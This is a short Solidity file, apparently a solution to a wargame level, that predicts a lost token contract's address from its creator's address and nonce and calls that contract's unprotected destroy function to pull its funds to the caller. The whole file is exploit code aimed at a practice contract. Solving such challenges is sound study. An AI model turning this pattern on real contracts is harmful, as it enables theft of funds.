// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract SimpleToken {

  function destroy(address payable _to) public {}

}

contract RecoveryExploit {

    SimpleToken simpleToken;
    address targetAddr;

    constructor(address _instanceAddr) public {
        // I honestly don't know what bytes1(0xd6) and bytes1(0x94) are for 
        // they're not specified in Ethereum docs about RLP
        // maybe something changed with solidty version?
        targetAddr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _instanceAddr, bytes1(0x01))))));
        simpleToken = SimpleToken(targetAddr);
    }

    // just to check out if address is correct
    function getTargetAddress() public view returns (address) {
        return targetAddr;
    }

    function recoverFunds() public {
        simpleToken.destroy(msg.sender);
    }
}